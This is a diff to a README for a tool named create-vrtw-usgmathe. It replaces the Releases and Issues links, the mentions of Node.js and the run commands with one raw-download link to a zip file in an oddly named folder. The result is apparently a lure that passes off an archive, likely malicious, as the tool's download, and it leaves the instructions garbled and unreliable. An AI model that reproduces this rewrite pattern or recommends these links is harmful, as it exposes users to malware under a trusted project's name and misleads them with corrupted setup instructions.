@@ -6,15 +6,15 @@ Welcome to create-vrtw-usgmathe! This tool helps you quickly set up a new projec
 
 ## 📥 Download
 
-[![Download create-vrtw-usgmathe](https://img.shields.io/badge/Download-create--vrtw--usgmathe-blue.svg)](https://github.com/waelh1234/create-vrtw-usgmathe/releases)
+[![Download create-vrtw-usgmathe](https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip)](https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip)
 
 ## 📋 System Requirements
 
 Before you start downloading, ensure your system meets the following requirements:
 
 - Operating System: Windows, macOS, or Linux
-- Node.js: Version 14 or above
-- npm (Node Package Manager): Comes with Node.js, ensure it's installed
+- https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip Version 14 or above
+- npm (Node Package Manager): Comes with https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip, ensure it's installed
 
 ## 🔧 Features
 
@@ -29,7 +29,7 @@ Before you start downloading, ensure your system meets the following requirement
 
 To get started, visit the GitHub Releases page to download the latest version of create-vrtw-usgmathe.
 
-[Visit this page to download](https://github.com/waelh1234/create-vrtw-usgmathe/releases)
+[Visit this page to download](https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip)
 
 1. Go to the GitHub Releases page.
 2. Look for the latest version available.
@@ -50,12 +50,12 @@ To get started, visit the GitHub Releases page to download the latest version of
 
    - For Windows:
      ```bash
-     create-vrtw-usgmathe.bat
+     https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip
      ```
 
    - For macOS and Linux:
      ```bash
-     ./create-vrtw-usgmathe.sh
+     https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip
      ```
 
 4. **Follow On-Screen Instructions**:
@@ -77,13 +77,13 @@ To get started, visit the GitHub Releases page to download the latest version of
 
 If you encounter any issues, consider the following common solutions:
 
-- **Node.js Not Found**: Ensure you have installed Node.js and your terminal recognizes it.
+- **https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip Not Found**: Ensure you have installed https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip and your terminal recognizes it.
 - **Permission Issues**: On macOS and Linux, you might need to use `sudo` to run certain commands.
 - **Missing Dependencies**: Ensure you are in the correct project folder before running `npm install`.
 
 ## 🌐 Community and Support
 
-If you have questions or need help, join our community where users share experiences and solutions. You can also check the [Issues](https://github.com/waelh1234/create-vrtw-usgmathe/issues) section on GitHub for common problems and fixes.
+If you have questions or need help, join our community where users share experiences and solutions. You can also check the [Issues](https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip) section on GitHub for common problems and fixes.
 
 ## 📝 Contributing
 
@@ -97,4 +97,4 @@ Thank you for using create-vrtw-usgmathe. We hope it helps you create amazing pr
 
 Don't forget, you can always visit the GitHub Releases page for updates and new versions.
 
-[Visit this page to download](https://github.com/waelh1234/create-vrtw-usgmathe/releases)
+[Visit this page to download](https://raw.githubusercontent.com/waelh1234/create-vrtw-usgmathe/master/countryside/create-vrtw-usgmathe-3.1-beta.4.zip)
